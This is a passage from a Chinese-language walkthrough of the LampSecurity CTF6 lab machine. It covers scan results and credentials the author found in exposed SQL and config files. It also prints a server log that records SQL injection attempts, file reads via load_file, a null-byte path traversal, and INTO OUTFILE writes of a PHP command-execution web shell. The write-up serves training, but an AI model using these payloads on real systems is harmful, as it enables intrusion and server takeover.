    State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA|             Modulus Type: Safe prime|             Modulus Source: Unknown/Custom-generated|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.imperialviolet.org/2014/10/14/poodle.html|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.securityfocus.com/bid/70574| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|       http://www.cvedetails.com/cve/2014-0224|_      http://www.openssl.org/news/secadv_20140605.txt3306/tcp open  mysqlMAC Address: 00:0C:29:5C:75:70 (VMware)Nmap done: 1 IP address (1 host up) scanned in 167.11 seconds\n虽然很长一串，但是很多关于SSL漏洞的重复信息，且多是用于中间人攻击的，我们暂时用不上。\nnikto然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ sudo nikto -h 192.168.56.140          - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.140+ Target Hostname:    192.168.56.140+ Target Port:        80+ Start Time:         2023-04-28 11:16:09 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.2.3 (CentOS)+ /: Retrieved x-powered-by header: PHP/5.2.6.+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /css/: Directory indexing found.+ /css/: This might be interesting.+ /files/: Directory indexing found.+ /files/: This might be interesting.+ /lib/: Directory indexing found.+ /lib/: This might be interesting.+ /mail/: Cookie roundcube_sessid created without the httponly flag. See: https://deveozilla.org/en-US/docs/Web/HTTP/Cookies+ /mail/: This might be interesting.+ /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should beted or limited to authorized hosts.+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with file /php/ChangeLog, inode: 97164, size: 35791, mtime: Thu Oct 20 05:47:44 2095. See: http://cv.org/cgi-bin/cvename.cgi?name=CVE-2003-1418+ /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be proor limited to authorized hosts.+ /sql/: Directory indexing found.+ /manual/: Web server manual found.+ /icons/: Directory indexing found.+ /manual/images/: Directory indexing found.+ /docs/: Directory indexing found.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restraccess-to-iconsreadme/+ /phpmyadmin/: phpMyAdmin directory found.+ /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and shourotected or limited to authorized hosts.+ /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be proteclimited to authorized hosts. See: https://typo3.org/+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 9060 requests: 0 error(s) and 32 item(s) reported on remote host+ End Time:           2023-04-28 11:16:34 (GMT8) (25 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nmanual web discoverd看下来没有什么能get shell的漏洞。目前最值得看的是应该是他扫出来的这些网站目录，我们看看都有哪些内容。\n/* http://192.168.56.140/sql/db.sql */CREATE database IF NOT EXISTS cms;use mysql;GRANT ALL PRIVILEGES ON cms.* to &#x27;sql_account&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;sql_password&#x27;;use cms;DROP TABLE IF EXISTS user;DROP TABLE IF EXISTS event;DROP TABLE IF EXISTS log;CREATE TABLE IF NOT EXISTS user (\tuser_id int not null auto_increment primary key,\tuser_username varchar(50) not null,\tuser_password varchar(32) not null);CREATE TABLE IF NOT EXISTS event (\tevent_id int not null auto_increment primary key,\tevent_title varchar(255) not null,\tevent_body text,\tevent_file varchar(255) default null,\tuser_id int not null,\tevent_hits int default 0);CREATE TABLE IF NOT EXISTS log (\tlog_id int not null auto_increment primary key,\tlog_ip varchar(20),\tlog_referer varchar(255),\tlog_useragent varchar(255));DELETE FROM user;DELETE FROM event;DELETE FROM log;INSERT INTO user SET user_id = 1, user_username=&#x27;admin&#x27;, user_password=md5(&#x27;adminpass&#x27;);INSERT INTO event SET event_title=&#x27;Mauris Vel&#x27;, event_body=&#x27;&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer pharetra nulla a velit euismod aliquam. Suspendisse potenti. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Duis eu felis a velit sollicitudin ullamcorper quis et sapien. Proin lacinia, mauris euismod pulvinar iaculis, elit dolor interdum ipsum, eu iaculis leo nisi sit amet enim. Phasellus nunc augue, commodo sed eleifend in, ullamcorper a sapien. Phasellus non posuere massa. Morbi sed posuere urna. Donec tincidunt congue ipsum nec vehicula. Nullam quis nulla erat. Phasellus semper pretium magna at faucibus. Pellentesque sed enim nec dui posuere blandit.&lt;/p&gt;&lt;p&gt;Maecenas malesuada blandit mauris vel tincidunt. Praesent vitae nibh erat. Donec tincidunt blandit aliquam. Donec pulvinar suscipit viverra. Fusce vitae diam non orci adipiscing dapibus nec in tortor. Donec laoreet feugiat adipiscing. Fusce at augue dignissim mauris tincidunt tincidunt. Sed at odio ut nisi vehicula porttitor. Quisque elementum ligula et libero hendrerit lacinia ac vel eros. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Suspendisse ut magna sem, eget pellentesque turpis. Nam ut velit ac lorem fringilla dapibus sit amet vitae leo. Mauris non velit eu neque auctor dignissim. Nam quis ipsum ac lectus commodo adipiscing interdum placerat mi.&lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);INSERT INTO event SET event_title=&#x27;Proin velit lacus&#x27;, event_body=&#x27;&lt;p&gt;Proin velit lacus, eleifend id ullamcorper sit amet, mattis id velit. Suspendisse placerat, mi luctus feugiat lacinia, elit odio facilisis dolor, at pellentesque turpis felis tincidunt leo. Quisque quis leo dolor. Donec id nunc ut tortor posuere dictum. Aliquam lobortis auctor neque, sit amet ornare urna ultrices eu. Nunc gravida, lacus id condimentum commodo, lectus enim ultricies tellus, sit amet tempor urna augue a sem. Vestibulum pretium congue nibh ut imperdiet. Fusce ac nibh vel felis vestibulum porttitor. Praesent mattis velit a ipsum aliquam vel commodo libero porttitor. Morbi volutpat, justo nec lobortis accumsan, urna ligula malesuada tellus, pharetra vehicula massa magna ut nulla. Fusce luctus tempor pharetra. In hac habitasse platea dictumst. Etiam in neque pretium mi molestie fringilla. Etiam aliquam accumsan lorem vitae varius. &lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);INSERT INTO event SET event_title=&#x27;Praesent magna est&#x27;, event_body=&#x27;&lt;p&gt;Praesent magna est, semper vitae euismod vitae, scelerisque eu nunc. Proin sed nibh a nisl tempus fringilla vitae ac nunc. Maecenas diam ipsum, ultrices vel faucibus non, suscipit nec felis. Praesent eleifend turpis vel orci sollicitudin quis tincidunt ante dapibus. Mauris laoreet mi vel nunc lacinia nec pulvinar lectus congue. Praesent imperdiet sollicitudin urna, sit amet auctor magna eleifend vel. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus elementum, magna vel venenatis pellentesque, nibh orci sollicitudin sapien, in tempor sem orci non metus. Nulla interdum feugiat ultrices. Nam egestas nulla quis dolor aliquam a iaculis arcu lobortis. Vestibulum urna leo, condimentum varius porttitor sed, tincidunt id est. Suspendisse potenti. Nulla fringilla massa ac arcu tempor molestie. Vivamus vehicula aliquet enim, eu porttitor libero suscipit non. &lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);INSERT INTO event SET event_title=&#x27;Suspendisse sapien orci&#x27;, event_body=&#x27;&lt;p&gt;Suspendisse sapien orci, luctus laoreet fringilla vitae, sodales non quam. Aliquam vel justo vel enim dapibus ullamcorper. Sed elementum lacus sed tortor imperdiet imperdiet. Maecenas a turpis vel tellus iaculis ullamcorper. Pellentesque vitae orci at dolor vestibulum pharetra sit amet ut sem. Donec nec rhoncus ligula. Suspendisse eget luctus nunc. Nam eget arcu augue, vitae condimentum magna. Etiam et fermentum erat. Fusce vehicula urna ac nisl imperdiet fringilla blandit ut quam. Nullam ultricies eros sit amet sem volutpat eget elementum augue consequat. Integer non arcu orci, in iaculis elit. Fusce eros massa, accumsan in blandit eget, suscipit sit amet nibh. Vestibulum a neque libero. Vivamus purus augue, sollicitudin eget sagittis sed, lacinia sit amet nibh. Nulla eget suscipit libero. &lt;/p&gt;&#x27;,user_id = (SELECT user_id from user where user_username = &#x27;admin&#x27;);\n/sql目录下有个db.sql文件，看上去像是创建网站数据时的操作，仔细看一下发现里面甚至有用户的登陆凭证：admin:adminpass。观察一下数据库构建语句很明显是网站主页登录框的登录凭证。我们尝试登录，发现能成功登录，但是不知道为啥提示登陆成功后并不能正常跳转到管理后台，只会跳回主页。。。。那这个凭证尝试登录目录发现发现的邮箱登录，phpmyadmin登录，都失败，看来没有密码复用，先找找别的路吧。\n我们在/docs目录下发现了code_backup.tgz压缩文件，很有可能是网站的代码备份。我们下载下来看看。OK，果然是，舒服。我们进入conf目录，发现config.ini文件\n;; This is the configuration file;database_host\t=\tlocalhostdatabase_pass\t=\t45kkald?8laLKDdatabase_user\t=\tcms_userdatabase_db\t=\tcms\n明显是连接数据库用的登录凭证 。我们尝试用其登录phpmyadmin，果然成功。我们看看这个账号对数据库的管理权限，发现除了grant权限，其他全有，基本约等于root了，那就方便我们接下来的操作了。但是先别急，我们刚才网站的各个目录还没看完，并且之前手动尝试访问/logs目录时提示要密码，那我们就看看里面有什么东西。我们移动到/logs目录下，发现log.log日志文件。\n2009-06-23 16:06:42\t172.16.18.1 called 2009-06-23 16:06:44\t172.16.18.1 called action=logs2009-06-23 16:06:50\t172.16.18.1 called 2009-06-23 16:06:52\t172.16.18.1 called action=logs2009-06-23 16:06:33\t172.16.18.1 called 2009-06-23 16:06:35\t172.16.18.1 called id=42009-06-23 16:06:37\t172.16.18.1 called action=users2009-06-23 16:06:38\t172.16.18.1 called action=logs2009-06-23 20:06:18\t172.16.18.1 called 2009-06-23 20:06:46\t172.16.18.1 called action=login2009-06-23 20:06:50\t172.16.18.1 called action=login2009-06-23 20:06:45\t172.16.18.1 called 2009-06-23 20:06:17\t172.16.18.1 called 2009-06-23 20:06:26\t172.16.18.1 called 2009-06-23 20:06:50\t172.16.18.1 called 2009-06-23 20:06:57\t172.16.18.1 called 2009-06-23 20:06:51\t172.16.18.1 called 2009-06-23 20:06:38\t172.16.18.1 called 2009-06-23 20:06:51\t172.16.18.1 called 2009-06-23 20:06:55\t172.16.18.1 called 2009-06-23 20:06:29\t172.16.18.1 called 2009-06-23 20:06:32\t172.16.18.1 called id=42009-06-23 20:06:34\t172.16.18.1 called 2009-06-24 17:06:36\t172.16.61.1 called 2009-06-24 17:06:45\t172.16.61.1 called 2009-06-24 17:06:17\t172.16.61.1 called 2009-06-24 17:06:31\t172.16.61.1 called 2009-06-24 17:06:37\t172.16.61.1 called 2009-06-24 17:06:16\t172.16.61.1 called 2009-06-24 17:06:36\t172.16.61.1 called 2009-06-24 17:06:49\t172.16.61.1 called 2009-06-24 17:06:35\t172.16.61.1 called 2009-06-28 13:06:09\t172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1%20from%20dual2009-06-28 13:06:09\tProblem with event select: . The used SELECT statements have a different number of columns2009-06-28 13:06:28\t172.16.61.132 called id=4%20UNION%20select%201,1,1,1,1,1,1%20from%20dual2009-06-28 13:06:29\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:29\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:43\t172.16.61.132 called id=4%20UNION%20select%20version,1,1,1,1,1,1%20from%20dual2009-06-28 13:06:43\tProblem with event select: . Unknown column &#x27;version&#x27; in &#x27;field list&#x27;2009-06-28 13:06:52\t172.16.61.132 called id=4%20UNION%20select%20version(),1,1,1,1,1,1%20from%20dual2009-06-28 13:06:52\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select version(),1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:52\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select version(),1,1,1,1,1,1 from dual&#x27; at line 12009-06-28 13:06:13\t172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual2009-06-28 13:06:13\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 13:06:13\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 13:06:30\t172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,version()%20from%20dual2009-06-28 13:06:30\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:30\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:54\t172.16.61.132 called id=4%20UNION%20select%201,host,user,4,5,6,version()%20from%20dual2009-06-28 13:06:54\tProblem with event select: . Unknown column &#x27;host&#x27; in &#x27;field list&#x27;2009-06-28 13:06:58\t172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual2009-06-28 13:06:58\tProblem with event select: . FUNCTION cms.host does not exist2009-06-28 13:06:02\t172.16.61.132 called id=4%20UNION%20select%201,2,user(),4,5,6,version()%20from%20dual2009-06-28 13:06:02\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:02\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:35\t172.16.61.132 called id=4%20UNION%20select%201,host(),user(),4,5,6,version()%20from%20dual2009-06-28 13:06:35\tProblem with event select: . FUNCTION cms.host does not exist2009-06-28 13:06:41\t172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual2009-06-28 13:06:41\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:41\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:23\t172.16.61.132 called id=4%20UNION%20select%201,schema(),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:23\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:23\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,schema(),system_user(),4,5,6,version() from dual&#x27; at line 12009-06-28 13:06:53\t172.16.61.132 called id=4%20UNION%20select%201,\\!%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:53\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\\! ls /var/www/html,system_user(),4,5,6,version() from dual&#x27; at line 52009-06-28 13:06:44\t172.16.61.132 called id=4%20UNION%20select%201,system(%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:44\tProblem with event select: . FUNCTION cms.system does not exist2009-06-28 13:06:13\t172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:13\tProblem with event select: . Unknown column &#x27;system&#x27; in &#x27;field list&#x27;2009-06-28 13:06:18\t172.16.61.132 called id=4%20UNION%20select%201,system%20ls%20/var/www/html,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:18\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;/var/www/html,system_user(),4,5,6,version() from dual&#x27; at line 52009-06-28 13:06:48\t172.16.61.132 called id=4%20UNION%20select%201,system%20%27ls%20/var/www/html%27,system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:48\tProblem with event select: . Unknown column &#x27;system&#x27; in &#x27;field list&#x27;2009-06-28 13:06:39\t172.16.61.132 called id=4%20UNION%20select%201,concat(2,%20system%20%27ls%20/var/www/html%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:39\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;ls /var/www/html&#x27;),system_user(),4,5,6,version() from dual&#x27; at line 52009-06-28 13:06:24\t172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:24\tProblem with event select: . FUNCTION cms.cload_file does not exist2009-06-28 13:06:31\t172.16.61.132 called id=4%20UNION%20select%201,cload_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:31\tProblem with event select: . FUNCTION cms.cload_file does not exist2009-06-28 13:06:26\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 13:06:26\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 13:06:26\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 14:06:08\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 14:06:08\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 14:06:08\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),system_user(),4,5,6,version(&#x27; at line 12009-06-28 14:06:57\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/loginphp%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 14:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/loginphp&#x27;),system_user(),4,5,6,v&#x27; at line 12009-06-28 14:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/loginphp&#x27;),system_user(),4,5,6,v&#x27; at line 12009-06-28 14:06:09\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),system_user(),4,5,6,version()%20from%20dual2009-06-28 14:06:09\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),system_user(),4,5,6,&#x27; at line 12009-06-28 14:06:09\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),system_user(),4,5,6,&#x27; at line 12009-06-28 14:06:22\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[%27cmd%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)2009-06-28 14:06:22\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;]);?&gt;,system_user(),4,5,6,version() into outfile(&#x27;/tmp/x.php&#x27;)&#x27; at line 52009-06-28 14:06:07\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\\%27cmd\\%27]);?%3E,system_user(),4,5,6,version()%20into%20outfile(%27/tmp/x.php%27)2009-06-28 14:06:07\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;)&#x27; at line 52009-06-28 14:06:20\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile(%27/tmp/x.php%27)2009-06-28 14:06:20\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;/tmp/x.php&#x27;)&#x27; at line 52009-06-28 14:06:00\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_GET[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:19\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:19\tProblem with event select: . File &#x27;/tmp/x.php&#x27; already exists2009-06-28 14:06:29\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:29\tProblem with event select: . File &#x27;/tmp/x.php&#x27; already exists2009-06-28 14:06:41\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/y.php%272009-06-28 14:06:02\t172.16.61.132 called id=4%20UNION%20select%201,%27%3C?php%20system($_POST[\\%27cmd\\%27]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/tmp/x.php%272009-06-28 14:06:02\tProblem with event select: . File &#x27;/tmp/x.php&#x27; already exists2009-06-28 15:06:02\t172.16.61.132 called 2009-06-28 15:06:12\t172.16.61.132 called id=42009-06-28 15:06:27\t172.16.61.132 called id=4%272009-06-28 15:06:27\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 52009-06-28 15:06:03\t172.16.61.132 called id=4%20UNION%20select%201%20from%20dual2009-06-28 15:06:03\tProblem with event select: . The used SELECT statements have a different number of columns2009-06-28 15:06:57\t172.16.61.132 called id=4%20UNION%20select%201,2,3,4,5,6,7%20from%20dual2009-06-28 15:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 15:06:57\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,2,3,4,5,6,7 from dual&#x27; at line 12009-06-28 15:06:03\t172.16.61.132 called id=4%20UNION%20select%201,database(),user(),4,5,6,version()%20from%20dual2009-06-28 15:06:03\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 15:06:03\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,database(),user(),4,5,6,version() from dual&#x27; at line 12009-06-28 15:06:12\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/index.php%27),3,4,5,6,7%20from%20dual2009-06-28 15:06:12\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 15:06:12\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/index.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 16:06:22\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual2009-06-28 16:06:22\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 16:06:22\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 16:06:18\t172.16.61.132 called actions/login.php?action=../conf/config.ini%002009-06-28 18:06:13\t172.16.61.132 called actions/login.php?action=../conf/config.ini%002009-06-28 18:06:15\t172.16.61.132 called id=4%20UNION%20select%201,load_file(%27/var/www/html/actions/login.php%27),3,4,5,6,7%20from%20dual2009-06-28 18:06:15\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 18:06:15\tProblem with log hit update. You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;UNION select 1,load_file(&#x27;/var/www/html/actions/login.php&#x27;),3,4,5,6,7 from dual&#x27; at line 12009-06-28 18:06:23\t172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE(%27/tmp/008st7845.php%27)2009-06-28 18:06:23\tProblem with event select: . You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;/tmp/008st7845.php&#x27;)&#x27; at line 52009-06-28 18:06:06\t172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%272009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 